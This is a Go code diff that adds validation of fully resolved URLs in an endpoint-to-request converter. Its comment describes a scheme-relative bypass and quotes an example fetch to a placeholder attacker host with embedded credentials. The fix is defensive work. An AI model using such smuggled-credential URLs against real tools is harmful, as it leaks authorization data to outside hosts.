@@ -64,6 +64,39 @@ func toRequests(endpoints []ExtractedEndpoint, captureURL string) []crawl.Observ
 		}
 		req.URL = resolveURL(ep.URL, base)
 
+		// SEC-BE-001 (third pass): validate the RESOLVED URL — the value that
+		// actually reaches every sink — not the pre-resolution literal.
+		//
+		// The previous fix gated ExtractedEndpoint.URL inside ExtractFromBundle and
+		// keyed off an http(s):// prefix test, which a scheme-relative literal walks
+		// straight past: `fetch("//u:p@attacker.example/api/collect")` has no scheme,
+		// so the gate skipped it, and then resolveURL's base.ResolveReference COPIES
+		// ref.User and inherits the base scheme — reconstituting
+		// `https://u:p@attacker.example/api/collect` after the check had already run.
+		// That candidate is floored to the default --confidence by classify Rule 7
+		// (it is an IsJSStaticSource with an API-indicator path), reaches
+		// OptionsProbe.probeURL where ssrf.ValidateURL inspects only scheme and
+		// resolved IP and never u.User, and — because probe.Config.AuthHeaders is
+		// populated by no non-test caller — makes net/http derive
+		// `Authorization: Basic <base64(userinfo)>` from req.URL.User on every probe.
+		// It also persisted to capture.json and put the attacker host in the spec's
+		// servers list.
+		//
+		// Gating here instead is both correct and simpler: this is the single point
+		// where the final URL exists, so there is exactly one check rather than one
+		// per producer (which also removes the double validation of concat
+		// endpoints, QUAL-001), and it cannot be bypassed by any spelling that
+		// resolution turns into an absolute URL.
+		//
+		// Only credential/scheme/host VALIDITY is enforced here. Same-origin remains
+		// a concat-only policy in extractConcatEndpoints — see the note there for
+		// why AST literals must keep cross-origin recall.
+		if crawl.IsAbsoluteHTTPURL(req.URL) {
+			if _, ok := crawl.ValidateFullURL(req.URL); !ok {
+				continue
+			}
+		}
+
 		// Synthesize JSON body when BodyFields are present.
 		if len(ep.BodyFields) > 0 {
 			req.Body = synthBody(ep.BodyFields)
